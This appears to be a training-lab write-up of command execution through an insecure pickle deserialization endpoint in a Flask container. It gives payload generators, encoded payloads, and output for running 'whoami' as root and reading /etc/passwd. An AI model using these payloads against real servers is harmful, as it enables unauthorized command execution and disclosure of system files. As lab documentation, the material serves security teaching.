# Flask Deserialization RCE Lab — Payload Documentation

## Payload 1: Identify the Current User

**Objective:** Identify the user account under which commands execute inside the Flask container.

**Command:**

```bash
whoami
```

**Payload Generator:**

```bash
python3 -c 'import pickle,base64; print(base64.urlsafe_b64encode(pickle.dumps("whoami")).decode())'
```

-> gASVCgAAAAAAAACMBndob2FtaZQu

**Output:**

```text
root
```

**Result:** Successful. The application returned `root`, indicating that the command executed as the root user inside the container.

**Explanation:** The application decodes the submitted Base64 input, deserializes the resulting bytes using `pickle.loads()`, and passes the resulting string to `execute_command()`. The command output is returned to the webpage.

---

## Payload 2: Read `/etc/passwd`

**Objective:** Display local account information from the Linux container.

**Command:**

```bash
cat /etc/passwd
```

**Payload Generator:**

```bash
python3 -c 'import pickle,base64; print(base64.urlsafe_b64encode(pickle.dumps("cat /etc/passwd")).decode())'
```
-> gASVEwAAAAAAAACMD2NhdCAvZXRjL3Bhc3N3ZJQu

**Output:**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

**Result:** Successful. The application displayed the contents of `/etc/passwd` on the webpage.

**Explanation:** The submitted input is decoded and deserialized into a Python string containing the shell command. Flask executes the command, captures its output, and renders the result in the HTML response.

